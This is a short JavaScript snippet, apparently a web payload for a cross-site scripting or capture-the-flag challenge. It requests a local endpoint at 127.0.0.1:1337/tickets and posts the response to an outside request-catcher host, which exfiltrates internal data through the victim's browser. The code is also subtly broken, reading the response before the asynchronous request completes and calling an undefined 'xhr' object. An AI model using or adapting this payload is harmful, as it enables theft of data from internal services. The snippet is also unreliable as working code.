const xhrr = new XMLHttpRequest();
xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);

xhrr.send();
v = xhrr.response;

xhrr.open("POST", "https://lemon.requestcatcher.com/", true);
xhrr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
data = v;
xhr.send(data);
